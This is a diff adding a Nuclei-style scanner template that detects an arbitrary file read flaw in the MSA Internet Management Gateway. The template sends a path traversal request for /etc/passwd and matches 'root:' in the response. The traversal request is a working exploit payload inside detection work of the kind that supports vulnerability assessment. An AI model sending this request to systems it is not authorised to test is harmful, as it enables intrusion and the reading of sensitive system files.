@@ -1,0 +1,28 @@
+id: msa-internet-management-gateway-anyfile-read
+info:
+  name: MSA Internet Management Gateway Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    The template detects an arbitrary file download vulnerability in the MSA Internet Management Gateway by attempting to access sensitive files like /etc/passwd.
+http:
+  - raw:
+      - |
+        GET /msa/../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
